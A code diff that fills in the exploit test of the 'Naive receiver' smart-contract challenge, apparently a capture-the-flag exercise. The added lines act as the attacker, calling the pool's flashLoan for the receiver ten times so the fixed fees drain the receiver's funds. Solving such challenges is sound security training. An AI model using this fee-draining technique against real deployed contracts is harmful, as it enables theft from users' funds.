@@ -31,6 +31,12 @@ describe('[Challenge] Naive receiver', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */   
+        // We take a flashloan using that receiver, and drain all the funds
+        // because the fee is really expensive.
+        this.pool = await this.pool.connect(attacker);
+        for (let i = 0; i < 10; i++) {
+            await this.pool.flashLoan(this.receiver.address, 1);
+        }
     });
 
     after(async function () {
